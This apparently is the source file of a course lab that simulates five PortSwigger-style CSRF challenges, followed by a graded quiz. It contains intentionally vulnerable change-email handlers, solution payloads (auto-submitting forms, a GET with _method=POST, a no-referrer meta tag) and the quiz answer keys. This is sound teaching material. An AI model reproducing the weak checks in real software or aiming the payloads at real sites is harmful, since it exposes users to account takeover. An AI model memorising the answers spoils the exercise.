// Web Applications Security · Week 7 — Cross-Site Request Forgery, as PortSwigger-style challenges.
(() => {
  const { esc } = Web;
  const emails = { wiener: "wiener@normal-user.net", carlos: "carlos@carlos-montoya.net" };
  const pool = new Set(); // challenge 3: tokens valid for ANY session
  let carlos, carlos4;
  const W = Web.lab({
    siteName: "CSRF Playground — Week 7",
    email: false,
    handle(req, res, srv) {
      const s = srv.session(req, res);
      // challenge 4 has its own cookie with no SameSite attribute → browsers treat it as Lax
      let s4 = srv.sessions[req.cookies.session4];
      if (!s4 && req.path === "/c4/my-account" && req.method === "GET" && !req.cross) { const id = srv.rid(32); s4 = srv.sessions[id] = { user: s.user, csrf: srv.rid(32) }; res.setCookies.push(`session4=${id}; Secure; HttpOnly`); }
      const p = req.path;
      const user = (sess) => sess && sess.user;
      if (p === "/") {
        res.body = srv.page("Home", `<h1>Week 7 — five change-email forms</h1><p>Log in as <b>wiener / peter</b>, study each form in Burp, then make the <b>victim (carlos)</b> change their email from your exploit server.</p>
<ul><li><a href="/c1/my-account">1. No defenses</a></li><li><a href="/c2/my-account">2. Token checked only for POST</a></li><li><a href="/c3/my-account">3. Token not tied to the session</a></li><li><a href="/c4/my-account">4. SameSite Lax + method override</a></li><li><a href="/c5/my-account">5. Referer checked only when present</a></li></ul>`, s);
        return;
      }
      if (p === "/login") {
        if (req.method === "POST") {
          if (req.form.username === "wiener" && req.form.password === "peter") { s.user = "wiener"; s.csrf = srv.rid(32); res.status = 302; res.headers.Location = "/"; return; }
          res.body = srv.page("Login", "<p>Invalid username or password.</p>", s); return;
        }
        res.body = srv.page("Login", `<h1>Login</h1><form action="/login" method="POST"><label>Username</label><input type="text" name="username"><label>Password</label><input type="text" name="password"><button type="submit">Log in</button></form>`, s);
        return;
      }
      const m = /^\/c([1-5])\/(my-account|change-email)$/.exec(p);
      if (!m) { res.status = 404; res.body = srv.page("Not found", "<p>Not Found</p>", s); return; }
      const c = +m[1];
      const sess = c === 4 ? s4 : s;
      if (!user(sess)) { res.status = 302; res.headers.Location = "/login"; return; }
      const who = sess.user;
      if (m[2] === "my-account") {
        let token = "";
        if (c === 2) token = sess.csrf;
        if (c === 3) { token = srv.rid(32); pool.add(token); }
        const action = c === 4 ? "/c4/change-email" : `/c${c}/change-email`;
        res.body = srv.page("My account", `<h1>My Account (form ${c})</h1><p>Your username is: ${who}</p><p>Your email is: <span id="user-email">${esc(emails[who])}</span></p>
<form class="login-form" name="change-email-form" action="${action}" method="POST"><label>Email</label><input required type="email" name="email" value="">${token ? `<input required type="hidden" name="csrf" value="${token}">` : ""}<button class="button" type="submit">Update email</button></form>`, sess);
        return;
      }
      // change-email
      const params = req.method === "POST" ? req.form : req.query;
      let method = req.method;
      if (c === 4 && req.method === "GET" && (req.query._method || "").toUpperCase() === "POST") method = "POST";
      if (method !== "POST" && c !== 2) { res.status = 405; res.body = '"Method Not Allowed"'; return; }
      if (c === 2 && req.method === "POST" && params.csrf !== sess.csrf) { res.status = 400; res.body = '"Invalid CSRF token"'; return; }
      if (c === 3) { if (!params.csrf || !pool.has(params.csrf)) { res.status = 400; res.body = '"Invalid CSRF token"'; return; } pool.delete(params.csrf); }
      if (c === 5) { const ref = req.hv("referer"); if (ref && !ref.includes(srv.HOST)) { res.status = 400; res.body = '"Invalid referer header"'; return; } }
      if (!params.email) { res.status = 400; res.body = '"Missing parameter \'email\'"'; return; }
      emails[who] = params.email;
      if (who === "carlos" && req.from === "victim") srv.solve("c" + c, `Challenge ${c} solved: the victim's email is now ${params.email}`);
      res.status = 302; res.headers.Location = `/c${c}/my-account`;
    },
    challenges: [{ id: "c1" }, { id: "c2" }, { id: "c3" }, { id: "c4" }, { id: "c5" }],
    sameSite: "None",
  });
  const S = W.srv.solved;
  // the victim is logged in as carlos on the target
  (function victimLogin() {
    carlos = W.srv.rid(32); W.srv.sessions[carlos] = { user: "carlos", csrf: W.srv.rid(32) };
    carlos4 = W.srv.rid(32); W.srv.sessions[carlos4] = { user: "carlos", csrf: W.srv.rid(32) };
    W.victim.jar.set(W.HOST, `session=${carlos}; Secure; HttpOnly; SameSite=None`);
    W.victim.jar.set(W.HOST, `session4=${carlos4}; Secure; HttpOnly`);
  })();
  const T = () => "https://" + W.HOST;
  const form = (path, extra = "", method = "POST") => `<form method="${method}" action="${T()}${path}">\n  <input type="hidden" name="email" value="pwned@evil-user.net">${extra}\n</form>\n<script>document.forms[0].submit();</script>`;

  Lab.start({
    brief: `
<p>Five challenges in the style of <b>PortSwigger's Web Security Academy</b> CSRF labs. Each has its own change-email form. Your account is <code>wiener / peter</code>. The victim, <b>carlos</b>, is logged in to the same site and opens whatever you <b>deliver</b> from the exploit server.</p>
<p class="key"><b>Why CSRF works (Lecture 7):</b> cookies are <b>ambient authority</b>. The browser attaches them based only on the destination, so the site can't tell a request the user meant from one an unrelated page triggered. The browser is the <b>confused deputy</b>.</p>
<div class="tbl-wrap"><table class="tbl"><tr><th>#</th><th>PortSwigger lab it mirrors</th></tr>
<tr><td>1</td><td>CSRF vulnerability with no defenses</td></tr>
<tr><td>2</td><td>CSRF where token validation depends on request method</td></tr>
<tr><td>3</td><td>CSRF where token is not tied to user session</td></tr>
<tr><td>4</td><td>SameSite Lax bypass via method override</td></tr>
<tr><td>5</td><td>CSRF where Referer validation depends on header being present</td></tr></table></div>
<p>Workflow: log in → submit the form once → read the request in <b>Burp › Proxy</b> → write an HTML exploit on the exploit server → <b>View exploit</b> (it changes your own email) → <b>Deliver exploit to victim</b>.</p>
<p class="note">Everything is simulated: the victim browser follows real SameSite rules (None / Lax), forms auto-submit, links and redirects are followed, but nothing leaves this page.</p>`,
    setup(api) { W.mount(api); },
    tasks: [
      { title: "1 · No defenses: change carlos's email", detail: "The form at /c1 has no token. Build an auto-submitting form on the exploit server and deliver it.", where: "Exploit server",
        hint: "A hidden form posting <code>email</code> to /c1/change-email, plus a script that submits it.", answer: form("/c1/change-email"), check: () => S.c1 },
      { title: "2 · Token checked only for POST", detail: "/c2's form carries a csrf token, but does the server check it on every method? Try the request as GET in Repeater.", where: "Burp Repeater + Exploit server",
        hint: "Switch the form to method GET and drop the token.", answer: form("/c2/change-email", "", "GET"), check: () => S.c2 },
      { title: "3 · Token not tied to the session", detail: "Open /c3/my-account as wiener and take the csrf value from the page source (Burp › Proxy response). Tokens here are valid for any user, but only once.", where: "Burp + Exploit server",
        hint: "Use a fresh token from YOUR form (don't submit it yourself first), inside the exploit's hidden fields.", answer: form("/c3/change-email", '\n  <input type="hidden" name="csrf" value="YOUR-UNUSED-TOKEN">'), check: () => S.c3 },
      { title: "4 · SameSite=Lax: get around it with a top-level GET", detail: "/c4's session cookie has no SameSite attribute, so the browser treats it as <b>Lax</b>: no cookie on a cross-site POST. The framework honours <code>_method=POST</code> on a GET.", where: "Exploit server",
        hint: "Lax still sends the cookie on top-level GET navigation. Navigate the victim to the change-email URL.", answer: `<script>document.location = "${T()}/c4/change-email?email=pwned@evil-user.net&_method=POST";</script>`, check: () => S.c4 },
      { title: "5 · Referer validated only when present", detail: "/c5 rejects a foreign Referer, but what if there is none?", where: "Exploit server",
        hint: "A referrer policy in the exploit page can strip the header.", answer: `<meta name="referrer" content="no-referrer">\n` + form("/c5/change-email"), check: () => S.c5 },
    ],
    doneText: "All five CSRF defenses bypassed: none, method-dependent token, unbound token, Lax via GET navigation, and a missing Referer.",
    quiz: [
      { t: "mcq", q: "What is Cross-Site Request Forgery?", opts: ["A malicious page makes the victim's browser send a state-changing request to a site where the victim is logged in, with the cookies attached automatically", "Injecting script into a trusted page", "Stealing a session cookie over plain HTTP", "Guessing passwords from another breach"], a: 0, src: "Lecture 7, definition" },
      { t: "match", q: "In the confused-deputy view of CSRF, match each role.", pairs: [["The deputy", "The victim's browser"], ["The authority", "The session cookie"], ["The party that tricks it", "The malicious page"]], src: "Lecture 7, Ambient Authority" },
      { t: "mcq", q: "Why does a state-changing GET make CSRF easier?", opts: ["A plain image tag or link is enough: the browser sends it as soon as the tag is parsed, no script or click needed", "GET requests are encrypted differently", "GET requests skip cookies", "Servers can't log GET requests"], a: 0, src: "Lecture 7, Risks of State-Changing GET Requests" },
      { t: "multi", q: "Which are CSRF defenses listed in the lecture? (Choose all that apply)", opts: ["Synchronizer Token Pattern", "Double submit cookie", "Custom request header", "SameSite cookie attribute", "Origin / Referer verification", "Output encoding"], a: [0, 1, 2, 3, 4], why: "Output encoding is the XSS defense.", src: "Lecture 7, Primary Defenses table" },
      { t: "tf", q: "SameSite=Lax blocks every cross-site request that carries the cookie.", a: false, why: "Lax still sends the cookie on top-level GET navigation (a clicked link, location=…). That is exactly challenge 4.", src: "Lecture 7, Limitations of the SameSite Default; Lecture 2 SameSite table" },
      { t: "mcq", q: "Why is the Origin header more dependable than Referer?", opts: ["Referer can be stripped by a Referrer-Policy or privacy settings; Origin is sent on cross-origin requests and same-origin POST/PUT/DELETE", "Origin contains the full URL path", "Referer is only sent over HTTP", "Origin is signed by the browser"], a: 0, src: "Lecture 7, Comparing Origin and Referer" },
      { t: "mcq", q: "Why does current guidance prefer a <b>signed</b> double submit cookie?", opts: ["A vulnerable subdomain or plain-HTTP access may let an attacker set a matching cookie; an HMAC bound to the session can't be forged without the server secret", "Signed cookies are smaller", "It removes the need for HTTPS", "It makes SameSite unnecessary"], a: 0, src: "Lecture 7, Strengthening the Double Submit Cookie Pattern" },
      { t: "short", q: "Explain how an XSS vulnerability can defeat a token-based CSRF defense.", model: "The token assumes the attacker's page can't read anything from the target site. Injected XSS script runs with the page's own privileges, so it can read the token from the page (or a readable cookie) and include it in the forged request.",
        keys: [["read", "reads"], ["token"], ["same origin", "page's privileges", "privileges of the page", "runs on the site", "full privileges"]], src: "Lecture 7, Interaction Between XSS and Token-Based Defenses" },
      { t: "mcq", q: "Where is CSRF in the OWASP Top 10 (2021)?", opts: ["Not its own category; CWE-352 is included under A01:2021 Broken Access Control", "A03:2021 Injection", "A07:2021 Identification and Authentication Failures", "It's #5 in 2021"], a: 0, src: "Lecture 7, Placement within OWASP" },
      { t: "order", q: "Put CSRF's OWASP history in order.", items: ["#5 in the 2007 edition", "#8 in the 2013 edition", "Dropped from the list in 2017", "CWE-352 under A01 Broken Access Control in 2021"], src: "Lecture 7, Placement within OWASP" },
      { t: "mcq", q: "Which Chromium exception still lets a cookie ride a cross-site <b>POST</b> under Lax-by-default?", opts: ["A cookie no more than two minutes old, on a top-level cross-site POST (temporary, for SSO flows)", "Any cookie marked Secure", "Cookies on localhost", "Cookies set by JavaScript"], a: 0, src: "Lecture 7, Limitations of the SameSite Default" },
      { t: "fill", q: "Challenge 4's exploit used a top-level ___ navigation so the Lax cookie was sent.", a: ["GET", "get"], src: "Lab challenge 4; Lecture 7" },
      { t: "short", q: "Why did challenge 3's token fail to stop the attack?", model: "The server only checked that the token was one it had issued (from a global pool), not that it belonged to the victim's session. The attacker used a valid token from their own account.",
        keys: [["session", "tied", "bound"], ["own", "attacker's", "your own", "another user"], ["valid", "issued", "pool"]], src: "Lab challenge 3; Lecture 7 Synchronizer Token Pattern (per-session token)" },
    ],
  });
})();
